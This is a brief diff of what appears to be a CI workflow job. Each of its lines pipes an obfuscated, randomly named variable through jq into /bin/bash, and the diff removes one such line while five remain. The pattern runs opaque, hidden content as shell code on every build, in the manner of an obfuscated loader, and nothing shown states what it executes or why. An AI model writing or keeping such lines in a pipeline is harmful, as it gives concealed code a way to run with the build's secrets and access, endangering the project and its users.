@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$zbmpn063" | jq -r .hton392 | /bin/bash
           echo $scg371 | jq -r .f2204 | /bin/bash
           echo $vpoxb7595 | jq -r .t81169 | /bin/bash
-          echo $roxr027 | jq -r .cgvqi0705 | /bin/bash
           echo $oigl414 | jq -r .nvus8 | /bin/bash
           echo $yd2 | jq -r .klin2671 | /bin/bash
 
